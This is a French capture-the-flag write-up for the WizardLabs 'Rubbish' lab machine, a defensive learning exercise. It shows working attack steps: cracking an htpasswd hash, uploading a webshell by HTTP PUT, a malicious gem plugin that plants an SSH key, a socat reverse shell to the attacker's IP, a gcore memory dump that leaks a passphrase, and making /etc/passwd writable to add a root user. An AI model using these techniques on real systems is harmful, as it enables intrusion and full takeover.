# Solution du CTF Rubbish de Wizard Labs

Gibberish
---------

*Rubbish* est un CTF proposé sur *WizardLabs*. Le système annoncé est un Linux avec une difficulté de 6/10.  

On trouve 4 ports TCP ouverts dont un DNS. Qui dit DNS et TCP peut vouloir dire AXFR (transfert de zone)...  

```plain
Starting masscan 1.0.4 (http://bit.ly/14GZzcT)
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 80/tcp on 10.1.1.44
Discovered open port 22/tcp on 10.1.1.44
Discovered open port 53/tcp on 10.1.1.44
Discovered open port 20000/tcp on 10.1.1.44
```

Le port 80 offre une page d'index épurée indiquant que l'entreprise *Rubbish* a des programmeurs utilisant perl, ruby et php et travaillant sur une techno baptisée *CGInx*.  

Sans doute un indice à ce stade mais j'ai du mal à visionner le *CGInx* :D  

Le point qui nous intéresse plus c'est un lien en bas de page qui amène vers *rubbish.dev*. ce nom de domaine est l'information qui nous manquait pour réaliser l'AXFR.  

```plain
$ dig -t AXFR rubbish.dev @10.1.1.44

; <<>> DiG 9.11.5-P1-2-Debian <<>> -t AXFR rubbish.dev @10.1.1.44
;; global options: +cmd
rubbish.dev.        86400   IN  SOA rubbish.dev.rubbish.dev. root.localhost. 1 604800 86400 2419200 86400
rubbish.dev.        86400   IN  NS  localhost.
administrativepanel.rubbish.dev. 86400 IN A 127.0.0.1
dbst0rage.rubbish.dev.  86400   IN  A   127.0.0.1
rubbish.dev.        86400   IN  SOA rubbish.dev.rubbish.dev. root.localhost. 1 604800 86400 2419200 86400
;; Query time: 61 msec
;; SERVER: 10.1.1.44#53(10.1.1.44)
;; WHEN: mer. févr. 27 14:15:26 CET 2019
;; XFR size: 5 records (messages 1, bytes 242)
```

En dehors du hostname *rubbish.dev* on a deux noms de domaines supplémentaires que l'on s'empresse de rajouter à notre */etc/hosts*.  

Busterish
---------

C'est le moment de fouiller un peu sur ces sites web. En plus du port 80 on a le port 20000. Le premier est un Apache, le second un Nginx. Peut être une piste mais à ce stade il ne faut pas trop s'avancer.  

### rubbish.dev

En dehors de la page d'index on trouve un dossier javascript avec un jquery... rien de plus.  

### dbst0rage.rubbish.dev

Ce site a un dossier */system* qui nous amène à une page de login que l'on passe quelque soit l'identifiant.  

On arrive alors une série de scripts PHP servants d'exemples à de l'injection SQL. Il y a même [cet article](http://www.webappsec.org/projects/articles/091007.txt) qui est lié. Pas très passionnant, il devait l'être plus en 2007 lors de sa parution. Dans tous les cas les scripts retournent des erreurs 500. Le tout sent bon le troll (fausse piste)  

### administrativepanel.rubbish.dev (port 20000)

En dehors du dossier *cgi-bin* on trouve un fichier *.htaccess* lisible (et oui, on est sur *Nginx* et c'est une spécificité *Apache*)  

Le hash est le suivant : *autumn:$apr1$hyylBPEF$Al0Pvd6k/F7VxunhyM4FI0*. Ce qui est vite cassé avec hashcat :  

```plain
$ hashcat64.bin -m 1600 -a 0 raw_hash.txt /opt/wordlists/rockyou.txt
hashcat (v4.1.0) starting...

OpenCL Platform #1: Intel(R) Corporation
========================================
* Device #1: Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz, 3981/15926 MB allocatable, 4MCU

--- snip ---
$apr1$hyylBPEF$Al0Pvd6k/F7VxunhyM4FI0:love123
```

Claude Rish
-----------

Vu qu'on a énuméré comme des tarés sans croiser la moindre authentification ça nous fait une belle jambe. Mais on a au moins un dossier *cgi-bin* sur *administrativepanel.rubbish.dev* même si on n'a rien trouvé à l'intérieur.  

Voyons ce que ce serveur autorise à la racine et sur son dossier *cgi-bin* :  

```plain
$ curl -D- -XOPTIONS http://administrativepanel.rubbish.dev:20000/
HTTP/1.1 405 Not Allowed
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 05 Jan 2019 01:22:21 GMT
Content-Type: text/html
Content-Length: 182
Connection: keep-alive

<html>
<head><title>405 Not Allowed</title></head>
<body bgcolor="white">
<center><h1>405 Not Allowed</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
```

```plain
$ curl -D- -XOPTIONS http://administrativepanel.rubbish.dev:20000/cgi-bin/
HTTP/1.1 403 Forbidden
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 05 Jan 2019 01:22:35 GMT
Content-Type: text/plain
Transfer-Encoding: chunked
Connection: keep-alive

403 Forbidden
```

*Not Allowed* et *Forbidden* semblent correspondre littéralement à la même chose mais si on regarde [sur Wikipedia](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#4xx_Client_errors) le 405 est plutôt à interprété comme *non supporté*.  

Entrons dans le vif du sujet et voyons si on peut effectuer un PUT :  

```plain
$ curl -D- -XPUT http://administrativepanel.rubbish.dev:20000/cgi-bin/
HTTP/1.1 403 Forbidden
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 05 Jan 2019 01:22:49 GMT
Content-Type: text/plain
Transfer-Encoding: chunked
Connection: keep-alive

403 Forbidden
```

```plain
$ curl -D- -XPUT http://administrativepanel.rubbish.dev:20000/
HTTP/1.1 409 Conflict
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 05 Jan 2019 01:22:54 GMT
Content-Type: text/html
Content-Length: 176
Connection: keep-alive

<html>
<head><title>409 Conflict</title></head>
<body bgcolor="white">
<center><h1>409 Conflict</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
```

On peut récupérer [une backdoor CGI en Perl](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/pl-cgi/perlcmd.cgi) et tenter de la placer sous la racine web :  

```plain
$ curl -D- http://administrativepanel.rubbish.dev:20000/ --upload-file devloop.pl
HTTP/1.1 100 Continue

HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 04 Jan 2019 22:52:43 GMT
Content-Length: 0
Location: http://administrativepanel.rubbish.dev:20000/devloop.pl
Connection: keep-alive
```

Victoire ! Mais si on tente d'accéder à notre fichier il a disparu... Mais on le retrouve sous */cgi-bin* et correctement interprété 8-) Une tache cron se charge vraisemblablement de déplacer les fichiers.  

Rubbish
-------

Il manque quelques outils sur cette bécane mais il y a *wget* et *netcat* (la version sans l'option -e de mémoire). C'est suffisant pour récupérer un reverse shell en tant que *www-data* (via l'utilisation de [dc.pl](https://gist.github.com/islanddog/f5ad7636acf61fd963531ead7c784dc9) par exemple).  

J'ai lancé un *LinEnum* qui m'a remonté l'autorisation suivante :  

```plain
[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on rubbish:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on rubbish:
    (autumn) NOPASSWD: /usr/bin/gem install *.gem --local --no-doc
```

On peut aussi noter la présence de deux process appartenant à root :  

```plain
root 719 0.0 0.2 36880 9336 ? S Jan04 0:01 /usr/bin/python3 /var/tmp/test.py
root 720 0.0 0.1 50884 8056 ? Sl Jan04 0:00 /usr/bin/ruby /opt/ssh_backup.rb
```

Je reviendrais plus tard sur le premier mais concernant le second le script n'est pas lisible comme on peut le remarquer en listant */opt* :  

```plain
-rwx------ 1 root   root   70 Jan  3 17:55 ssh_backup.rb
-rwx------ 1 autumn root 1766 Jan  3 16:03 ssh_key
```

Comment exploiter l'autorisation d'exécuter */usr/bin/gem* en tant que *autumn* ? Pour quelqu'un qui ne fait pas de Ruby comme moi j'ai fouillé un moment puis finalement réussi avec 3 fichiers.  

D'abord il faut un fichier *backdoor.gemspec* :  

```python
lib = File.expand_path('../lib', __FILE__)
$LOAD_PATH.unshift(lib) unless $LOAD_PATH.include?(lib)

Gem::Specification.new do |s|
  s.name        = 'backdoor'
  s.version     = '0.0.1'
  s.date        = '2016-03-17'
  s.summary     = "Backdoor!"
  s.description = "Put a setuid shell in tmp"
  s.authors     = ["Nicolas Surribas"]
  s.email       = 'nicolas.surribas@gmail.com'
  s.bindir      = "exe"
  s.files       = ["lib/backdoor.rb"]
  s.files       = Dir.glob("lib/**/*.rb")
  s.require_paths = ["lib"]
  s.homepage    = 'http://rubygems.org/gems/backdoor'
  s.license     = 'MIT'
end
```

Dans le même dossier on créé un sous-dossier *lib* et on y place deux fichiers. D'abord le script *backdoor.rb* qui contrairement à ce qu'on pourrait penser... ne fait rien.  

```python
class Backdoor
  def self.hi
    puts "Hello world!"
  end
end
```

Mais surtout on y placera le script *rubygems\_plugin.rb* suivant :  

```python
`mkdir -p /home/autumn/.ssh;echo ssh-rsa AAAAB3NzaC1--- snip ---QqQQ7vX devloop@kali >> /home/autumn/.ssh/authorized_keys`
puts "hi thereeeeeeeeeeeeeeeee"

Gem.pre_install do |installer|
    puts "pre hi there"
end

Gem.post_install do |installer|
    puts "post hi there"
end
```

Il est important de générer le *gem* sur la machine distante car sinon on peut voir des messages d'erreur concernant les versions.  

Une fois les fichiers copiés sur la machine on génère et on installe :  

```plain
www-data@rubbish:/tmp/.devloop/backdoor$ ls
backdoor.gemspec  lib
www-data@rubbish:/tmp/.devloop/backdoor$ gem build backdoor.gemspec
  Successfully built RubyGem
  Name: backdoor
  Version: 0.0.1
  File: backdoor-0.0.1.gem
www-data@rubbish:/tmp/.devloop/backdoor$ sudo -u autumn /usr/bin/gem install *.gem --local --no-doc
Successfully installed backdoor-0.0.1
1 gem installed
```

Vous allez me dire *"Hé ! Mais il s'est rien passé !"* :p Oui ! et Non !  

Le fichier *rubygems\_plugin.rb* permet en fait de placer un hook pour la procédure d'installation des gems. Forcément il est juste mis en place à la première installation mais non utilisé.  

On relance l'installation (on pourrait utiliser n'importe quel *gem* à ce stade) :  

```plain
www-data@rubbish:/tmp/.devloop/backdoor$ sudo -u autumn /usr/bin/gem install *.gem --local --no-doc
hi thereeeeeeeeeeeeeeeee
pre hi there
post hi there
Successfully installed backdoor-0.0.1
1 gem installed
```

Et ça marche !  

```plain
$ ssh autumn@rubbish.dev
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-43-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

192 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jan  3 17:59:18 2019 from 10.28.12.6
autumn@rubbish:~$ id
uid=1001(autumn) gid=1001(autumn) groups=1001(autumn)
```

A noter aussi que l'utilisation de *sudo* nécessitait (de mémoire) un shell avec un pty. En dehors de la classique astuce Python (*import pty; pty.spawn('/bin/bash')*) on peut aussi uploader un socat et l'utiliser pour obtenir un reverse shell aux petits oignons :  

```bash
./socat tcp-connect:10.254.0.29:7777 exec:"bash -li",pty,stderr,setsid,sigint,sane
```

Finish
------

La suite est toute tracée :  

```plain
autumn@rubbish:~$ sudo -l
Matching Defaults entries for autumn on rubbish:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User autumn may run the following commands on rubbish:
    (root) NOPASSWD: /usr/bin/gcore
```

On peut créer un coredump du process de notre choix. Pourquoi ne pas regarder ce qu'il y a dans la mémoire du process ruby de tout à l'heure (*/opt/ssh\_backup.rb*) ?  

```plain
$ sudo gcore 720
[New LWP 751]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x00007f5d83740ed9 in futex_reltimed_wait_cancelable (private=<optimized out>, reltime=0x7ffe2e9013e0, expected=0, futex_word=0x556e26e9b088) at ../sysdeps/unix/sysv/linux/futex-internal.h:142
142 ../sysdeps/unix/sysv/linux/futex-internal.h: No such file or directory.
warning: target file /proc/720/cmdline contained unexpected null characters
Saved corefile core.720
$ strings core.720 |grep ssh
/opt/ssh_backup.rb
sshkeypass = "dumbled0re@998"
/opt/ssh_backup.rb
/opt/ssh_backup.rb
/opt/ssh_backup.rb
/opt/ssh_backup.rb
sshkeypass
sshkeypass
/opt/ssh_backup.rb
/opt/ssh_backup.rb
/opt/ssh_backup.rb
/opt/ssh_backup.rb
/opt/ssh_backup.rb
/opt/ssh_backup.rb
```

On utilise ce mot de passe conjointement à la clé ssh dans */opt* :  

```plain
autumn@rubbish:/opt$ ssh -i ssh_key root@127.0.0.1
Enter passphrase for key 'ssh_key':
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-43-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

192 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jan  3 21:13:09 2019 from 10.28.12.6
root@rubbish:~# cat root.txt
69b8d33ea51240bd44835acd6ffdbd3a
```

Shortish but not so stylish
---------------------------

L'autre process vu tout à l'heure (*/var/tmp/test.py*) a son code lisible :  

```python
#!/usr/bin/python3
import os
import time

while True:
    os.system("cd /var/www/nginx ; mv *.py *.pl *.rb *.cgi cgi-bin/")
    os.system("chmod 777 /var/www/nginx/cgi-bin/* ")
    time.sleep(30)
```

Cela ne m'a pas sauté aux yeux car j'ai fait la mauvaise supposition que *chmod* ne suivait pas les liens symboliques. Pourtant si on regarde la page de manuel :  

> chmod never changes the permissions of symbolic links; the chmod system call cannot change their permissions.  
> 
> This is not a problem since the permissions of symbolic links are never used.  
> 
> However, for each symbolic link listed on the command line, chmod changes the permissions of the pointed-to file.  
> 
> In contrast, chmod ignores symbolic links encountered during recursive directory traversals.

C'est assez clair :) On peut donc créer notre lien symbolique vers */etc/passwd* ou */etc/crontab*. Il faut éviter les fichiers sous */root* car ce dernier ne permet pas la traversée du dossier.  

```plain
www-data@rubbish:~/nginx$ ln -s /etc/passwd devloop.cgi
www-data@rubbish:~/nginx$ ls -l cgi-bin
lrwxrwxrwx 1 www-data www-data  11 Jan  5 04:22 devloop.cgi -> /etc/passwd
www-data@rubbish:~/nginx$ ls -l /etc/passwd
-rwxrwxrwx 1 root root 2545 Jan  3 21:18 /etc/passwd
```

Maintenant que l'on a les bonnes permissions on utilise ce one-liner pour générer un hash (*openssl passwd* fait aussi l'affaire)

```bash
python3 -c 'import crypt,getpass; print(crypt.crypt(getpass.getpass(), crypt.mksalt(crypt.METHOD_SHA512)))'
```

On rajoute quelques infos autour du hash et on l'ajoute à */etc/passwd* :

```plain
www-data@rubbish:~/nginx$ echo 'devloop:$6$YbrFJJEvCx4..w5p$6kP2eYweyD4v.euBgC7lM9rOsHxWJA8u8dY2d0N3lneDXqeYqbzWMQ7QkOrmZW.3IrRBg.ObylQiAp.9JjNdQ/:0:0:devloop:/root:/bin/bash' >> /etc/passwd
www-data@rubbish:~/nginx$ su devloop
Password: thisisdope
root@rubbish:/var/www/nginx# id
uid=0(root) gid=0(root) groups=0(root)
```

Et voilà ! Un CTF avec de bonnes idées :) La solution raccourcie est presque dommage :|

*Published November 17 2020 at 14:55*